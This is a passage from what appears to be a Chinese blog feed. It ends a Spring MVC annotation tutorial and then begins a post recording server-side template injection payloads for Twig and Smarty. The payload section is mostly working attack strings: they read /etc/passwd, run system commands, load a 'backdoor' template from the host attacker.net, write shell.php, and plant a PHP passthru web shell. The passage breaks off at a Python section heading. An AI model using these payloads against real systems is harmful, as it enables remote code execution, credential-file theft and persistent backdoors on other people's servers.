class="string">&quot;age: &quot;</span> + user.getAge());</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;testSuccess&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>实体类user</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yutao.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String nickname;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getNickname</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.nickname;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setNickname</span><span class="params">(String nickname)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.nickname = nickname;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAge</span><span class="params">(<span class="keyword">int</span> age)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/03/31/SpringMVC%E5%88%9D%E6%8E%A2/image-20220331235316124.png" alt="image-20220331235316124"></p><h1 id="常用注解"><a href="#常用注解" class="headerlink" title="常用注解"></a>常用注解</h1><h2 id="RequestParam注解"><a href="#RequestParam注解" class="headerlink" title="RequestParam注解"></a>RequestParam注解</h2><ul><li>  作用：把请求中的指定名称的参数传递给控制器中的形参</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="meta">@RequestMapping(path = &quot;/hello&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">(<span class="meta">@RequestParam(value = &quot;nick&quot;, required = false)</span> String nickname)</span> </span>&#123;</span><br><span class="line">        System.out.println(nickname);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;testSuccess&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="RequestBody注解"><a href="#RequestBody注解" class="headerlink" title="RequestBody注解"></a>RequestBody注解</h2><p>作用：用于获取请求体的内容（注：get方法不可以）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testC&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">testC</span><span class="params">(<span class="meta">@RequestBody</span> String body)</span> </span>&#123;</span><br><span class="line">    System.out.println(body);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;testSuccess&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//post：nickname=BWH_Steven&amp;age=666&amp;address=beijing</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="PathVariable-注解"><a href="#PathVariable-注解" class="headerlink" title="PathVariable 注解"></a>PathVariable 注解</h2><p>用于绑定url中的占位符，例如：url中有/test/{id}，{id}就是占位符</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(path=&quot;/test/&#123;uid&#125;&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">testD</span><span class="params">(<span class="meta">@PathVariable(value=&quot;uid&quot;)</span> String id)</span> </span>&#123;</span><br><span class="line">    System.out.println(id);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;testSuccess&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="RequestHeader注解"><a href="#RequestHeader注解" class="headerlink" title="RequestHeader注解"></a>RequestHeader注解</h2><ul><li>  作用：获取指定请求头的值</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testE&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">testE</span><span class="params">(<span class="meta">@RequestHeader(value=&quot;Accept&quot;)</span> String header)</span> </span>&#123;</span><br><span class="line">    System.out.println(header);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;testSuccess&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>打印结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br></pre></td></tr></table></figure><h2 id="CookieValue注解"><a href="#CookieValue注解" class="headerlink" title="CookieValue注解"></a>CookieValue注解</h2><ul><li>  作用：用于获取指定cookie的名称的值</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testF&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">testF</span><span class="params">(<span class="meta">@CookieValue(value=&quot;JSESSIONID&quot;)</span> String cookieValue)</span> </span>&#123;</span><br><span class="line">        System.out.println(cookieValue);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;testSuccess&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1 id="相应数据以及结果视图"><a href="#相应数据以及结果视图" class="headerlink" title="相应数据以及结果视图"></a>相应数据以及结果视图</h1><p>接下来是：接受到用户的请求，并且进行一定的处理以后，如何进行正确的响应</p><h2 id="返回字符串"><a href="#返回字符串" class="headerlink" title="返回字符串"></a>返回字符串</h2><p>在前面的例子中，一直使用进行同名页面的跳转，例如返回 success 则跳转到 success.jsp 的页面中</p><p>需要注意的是，相应jsp页面中要写：<code>isELIgnored=&quot;false&quot;</code></p><h2 id="返回void"><a href="#返回void" class="headerlink" title="返回void"></a>返回void</h2><p>如果说直接去掉返回值，以及修改返回类型为void，会报出一个404异常看到地址栏中，去指向了一个 <code>http://localhost:8080/springmvc-response/user/testVoid.jsp</code> 的地址，也就是说它默认去查找了一个jsp页面（也就是 @RequestMapping(“/testVoid”) 值同名的 jsp），不过没有找到</p><p>如果想要在这种情况下，跳转页面可以使用请求转发，或者重定向跳转</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">@RequestMapping(&quot;/testVoid&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testVoid</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;请求转发或者重定向被执行了&quot;</span>);</span><br><span class="line"><span class="comment">// 1. 请求转发</span></span><br><span class="line">        request.getRequestDispatcher(<span class="string">&quot;/WEB-INF/pages/testSuccess.jsp&quot;</span>).forward(request, response);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 重定向</span></span><br><span class="line"><span class="comment">// response.sendRedirect(request.getContextPath()+&quot;/test2.jsp&quot;);</span></span><br><span class="line"></span><br><span class="line">        response.setCharacterEncoding(<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line"><span class="comment">// 3. 直接响应数据</span></span><br><span class="line">        response.getWriter().print(<span class="string">&quot;测试被执行了哈&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="返回值是ModelAndView对象"><a href="#返回值是ModelAndView对象" class="headerlink" title="返回值是ModelAndView对象"></a>返回值是ModelAndView对象</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/findUser&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> ModelAndView <span class="title">findUser</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ModelAndView modelAndView = <span class="keyword">new</span> ModelAndView();</span><br><span class="line">        <span class="comment">//跳转到jsp</span></span><br><span class="line">        modelAndView.setViewName(<span class="string">&quot;success&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//模拟从数据库中查询用户信息</span></span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        user.setNickname(<span class="string">&quot;李四&quot;</span>);</span><br><span class="line">        user.setAge(<span class="number">8888</span>);</span><br><span class="line"></span><br><span class="line">        modelAndView.addObject(<span class="string">&quot;user&quot;</span>, user);</span><br><span class="line">        <span class="keyword">return</span> modelAndView;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>success.jsp:</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$&#123;user.username&#125;</span><br><span class="line">$&#123;user.password&#125;</span><br></pre></td></tr></table></figure><h2 id="过滤静态资源"><a href="#过滤静态资源" class="headerlink" title="过滤静态资源"></a>过滤静态资源</h2><p>在 web.xml 中配置的 DispatcherServle（前端控制器），会拦截到所有的资源静态资源 （img、css、js）这样的文件也被拦截下面写如何不对静态资源进行拦截：</p><p>在springmvc.xml中配置</p><p>mvc:resources 标签配置不过滤</p><ul><li>  location 表示webapp目录下的包下的所有文件</li><li>  mapping 表示以/xxx开头的所有请求路径，如/xxx/a 或者/xxx/a/b</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--前端控制器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:resources</span> <span class="attr">mapping</span>=<span class="string">&quot;/css/**/&quot;</span> <span class="attr">location</span>=<span class="string">&quot;/css/&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:resources</span> <span class="attr">mapping</span>=<span class="string">&quot;/images/**/&quot;</span> <span class="attr">location</span>=<span class="string">&quot;/images/&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:resources</span> <span class="attr">mapping</span>=<span class="string">&quot;/js/**/&quot;</span> <span class="attr">location</span>=<span class="string">&quot;/js/&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>jsp</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;%--引入jquery--%&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;js/jquery-2.1.0.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        $(function () &#123;</span><br><span class="line">            $(<span class="string">&quot;#btn&quot;</span>).click(function () &#123;</span><br><span class="line">                alert(<span class="string">&quot;Just for test&quot;</span>);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;%--&lt;a href=<span class="string">&quot;user/testString&quot;</span>&gt;修改用户信息页面&lt;/a&gt;--%&gt;</span><br><span class="line">    &lt;%--&lt;a href=<span class="string">&quot;user/testForward&quot;</span>&gt;测试一下&lt;/a&gt;--%&gt;</span><br><span class="line">    &lt;button id=<span class="string">&quot;btn&quot;</span>&gt;发送ajax请求&lt;/button&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h2 id="发送ajax请求"><a href="#发送ajax请求" class="headerlink" title="发送ajax请求"></a>发送ajax请求</h2><p>index.jsp</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">    &lt;%--引入jquery--%&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;js/jquery-2.1.0.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        $(function () &#123;</span><br><span class="line">            $(<span class="string">&quot;#btn&quot;</span>).click(function () &#123;</span><br><span class="line">                <span class="comment">//发送ajax请求</span></span><br><span class="line">                $.ajax(&#123;</span><br><span class="line">                    url:<span class="string">&quot;user/testAjax&quot;</span>,</span><br><span class="line">                    contentType:<span class="string">&quot;application/json;charset=UTF-8&quot;</span>,</span><br><span class="line">                    data:<span class="string">&#x27;&#123;&quot;username&quot;:&quot;zhangsan&quot;,&quot;password&quot;:&quot;888888&quot;&#125;&#x27;</span>,</span><br><span class="line">                    dataType:<span class="string">&quot;json&quot;</span>,</span><br><span class="line">                    type:<span class="string">&quot;post&quot;</span>,</span><br><span class="line">                    success:function (data) &#123;</span><br><span class="line">                        <span class="comment">//解析响应数据</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;)</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;button id=<span class="string">&quot;btn&quot;</span>&gt;发送ajax请求&lt;/button&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/testAjax&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testAjax</span><span class="params">(<span class="meta">@RequestBody</span> String body)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;testAjax 被执行了&quot;</span>);</span><br><span class="line">        System.out.println(body);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h1 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h1><h1 id="拦截器"><a href="#拦截器" class="headerlink" title="拦截器"></a>拦截器</h1><p>后面这些不写了，，想写了再写</p><blockquote><p>  <a href="https://juejin.cn/post/6844904100107124749">Spring MVC 层层递进</a></p><p>  <a href="https://segmentfault.com/a/1190000022586808">SpringMVC参数绑定入门就这一篇</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近想看看java，不知道从哪开始，。。正好spring有最近不太平，就从spring MVC开始看吧。&lt;/p&gt;
&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;开篇&quot;&gt;&lt;a href=&quot;#开篇&quot; class=&quot;headerlink&quot; title=&quot;开篇&quot;&gt;&lt;/a&gt;开篇&lt;/h1&gt;</summary>
      
    
    
    
    
    <category term="web,java" scheme="http://example.com/tags/web-java/"/>
    
  </entry>
  
  <entry>
    <title>SSTI payload记录</title>
    <link href="http://example.com/2022/03/29/SSTI/"/>
    <id>http://example.com/2022/03/29/SSTI/</id>
    <published>2022-03-28T16:00:00.000Z</published>
    <updated>2022-03-29T12:20:02.168Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2022/03/29/SSTI/1344396-20200911174631687-758048107.png" alt="img"></p><p>[toc]</p><h1 id="1-PHP中的ssti"><a href="#1-PHP中的ssti" class="headerlink" title="1.PHP中的ssti"></a>1.PHP中的ssti</h1><h2 id="Twig框架"><a href="#Twig框架" class="headerlink" title="Twig框架"></a>Twig框架</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#125;&#125;:输出</span><br><span class="line"></span><br><span class="line">&#123;# 注释 #&#125;:注释</span><br><span class="line"></span><br><span class="line">&#123;% %&#125;：逻辑运算</span><br><span class="line">循环：</span><br><span class="line">&#123;% for word in words %&#125;</span><br><span class="line">&#123;&#123; word &#125;&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>测试用payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="number">2</span>*<span class="number">2</span>**<span class="number">3</span>&#125;&#125; = <span class="number">16</span></span><br><span class="line">&#123;<span class="comment"># 这里要注意的是，#要写成%23，不然会被浏览器当成锚点 #&#125;</span></span><br><span class="line">&#123;&#123;<span class="number">2</span>*<span class="number">2</span>**<span class="number">3</span>&#125;&#125;&#123;%<span class="number">23</span>%<span class="number">20</span>注释不会显示%<span class="number">20</span>%<span class="number">23</span>&#125; = <span class="number">16</span></span><br><span class="line">$&#123;<span class="number">7</span>*<span class="number">7</span>&#125; = $&#123;<span class="number">7</span>*<span class="number">7</span>&#125;</span><br><span class="line">&#123;&#123;<span class="number">7</span>*<span class="string">&#x27;7&#x27;</span>&#125;&#125; = <span class="number">49</span></span><br><span class="line">&#123;&#123;<span class="number">1</span>/<span class="number">0</span>&#125;&#125; = <span class="built_in">Error</span></span><br><span class="line">&#123;&#123;foobar&#125;&#125; Nothing</span><br><span class="line"></span><br><span class="line">&#123;<span class="comment"># Get Info #&#125;</span></span><br><span class="line">&#123;&#123;_self&#125;&#125; <span class="comment">#(Ref. to current application)</span></span><br><span class="line">&#123;&#123;_self.env&#125;&#125;</span><br><span class="line">&#123;&#123;dump(app)&#125;&#125;</span><br><span class="line">&#123;&#123;app.request.server.all|join(<span class="string">&#x27;,&#x27;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;<span class="comment"># File read #&#125;</span></span><br><span class="line"><span class="string">&quot;&#123;&#123;&#x27;/etc/passwd&#x27;|file_excerpt(1,30)&#125;&#125;&quot;</span>@</span><br><span class="line"></span><br><span class="line">&#123;<span class="comment"># Exec code #&#125;</span></span><br><span class="line">&#123;&#123;_self.env.setCache(<span class="string">&quot;ftp://attacker.net:2121&quot;</span>)&#125;&#125;&#123;&#123;_self.env.loadTemplate(<span class="string">&quot;backdoor&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;exec&quot;</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">&quot;id&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(<span class="string">&quot;system&quot;</span>)&#125;&#125;&#123;&#123;_self.env.getFilter(<span class="string">&quot;whoami&quot;</span>)&#125;&#125;</span><br><span class="line">&lt;<span class="comment">#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;cat /etc/passwd&quot;) &#125;</span></span><br><span class="line">&#123;&#123;[<span class="string">&#x27;id&#x27;</span>]|filter(<span class="string">&#x27;system&#x27;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&#x27;cat\x20/etc/passwd&#x27;</span>]|filter(<span class="string">&#x27;system&#x27;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&#x27;cat$IFS/etc/passwd&#x27;</span>]|filter(<span class="string">&#x27;system&#x27;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|map(<span class="string">&quot;system&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>, <span class="number">0</span>]|sort(<span class="string">&quot;system&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|filter(<span class="string">&quot;system&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="number">0</span>, <span class="number">0</span>]|reduce(<span class="string">&quot;system&quot;</span>, <span class="string">&quot;id&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;&#123;<span class="string">&quot;php phpinfo();&quot;</span>:<span class="string">&quot;/var/www/html/shell.php&quot;</span>&#125;|map(<span class="string">&quot;file_put_contents&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">全版本通用payload：</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|map(<span class="string">&quot;system&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>, <span class="number">0</span>]|sort(<span class="string">&quot;system&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="string">&quot;id&quot;</span>]|filter(<span class="string">&quot;system&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;[<span class="number">0</span>, <span class="number">0</span>]|reduce(<span class="string">&quot;system&quot;</span>, <span class="string">&quot;id&quot;</span>)|join(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span><br><span class="line">&#123;&#123;&#123;<span class="string">&quot;&lt;?php phpinfo();&quot;</span>:<span class="string">&quot;/var/www/html/shell.php&quot;</span>&#125;|map(<span class="string">&quot;file_put_contents&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="Smarty框架"><a href="#Smarty框架" class="headerlink" title="Smarty框架"></a>Smarty框架</h2><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//文件读</span></span><br><span class="line">&#123;<span class="built_in">self</span>::getStreamVariable(<span class="string">&quot;file:///etc/passwd&quot;</span>)&#125;</span><br><span class="line"><span class="comment">//other</span></span><br><span class="line">&#123;<span class="variable">$smarty</span>.version&#125;  <span class="comment">#获取smarty的版本号</span></span><br><span class="line">&#123;php&#125;phpinfo();&#123;/php&#125;  <span class="comment">#执行相应的php代码，在Smarty3版本中已经废弃&#123;php&#125;标签，强烈建议不要使用。在Smarty 3.1，&#123;php&#125;仅在SmartyBC中可用。</span></span><br><span class="line">&#123;<span class="keyword">if</span> phpinfo()&#125;&#123;/<span class="keyword">if</span>&#125;    <span class="comment"># 执行相应的php代码</span></span><br><span class="line">&#123;<span class="built_in">self</span>::getStreamVariable(<span class="string">&quot;file:///etc/passwd&quot;</span>)&#125; <span class="comment"># 任意文件读取</span></span><br><span class="line">&#123;Smarty_Internal_Write_File::writeFile(<span class="variable">$SCRIPT_NAME</span>,<span class="string">&quot;&lt;?php passthru(<span class="subst">$_GET</span>[&#x27;cmd&#x27;]); ?&gt;&quot;</span>,<span class="built_in">self</span>::clearConfig())&#125; <span class="comment"># 文件写入</span></span><br><span class="line">&#123;system(<span class="string">&#x27;ls&#x27;</span>)&#125; <span class="comment"># compatible v3</span></span><br><span class="line">&#123;system(<span class="string">&#x27;cat index.php&#x27;</span>)&#125; <span class="comment"># compatible v3</span></span><br><span class="line">&#123;literal&#125;alert(<span class="string">&#x27;xss&#x27;</span>);&#123;/literal&#125; <span class="comment"># XSS</span></span><br></pre></td></tr></table></figure><h1 id="2-python中的ssti"><a href="#2-python中的ssti" class="headerlink" title="2.python中的ssti"></a>2.python中的ssti</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__class__  返回示例所属的类</span><br><span class="line">__mro__    返回一个类所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   返回一个类所继承的基类,返回字符串类型    <span class="comment"># __base__和__mro__都是用来寻找基类的</span></span><br><span class="line">__bases__  元组类型返回</span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure><p>通用的一些payload，版本不同排序不同</p><h2 id="0-通用"><a href="#0-通用" class="headerlink" title="0.通用"></a>0.通用</h2><h3 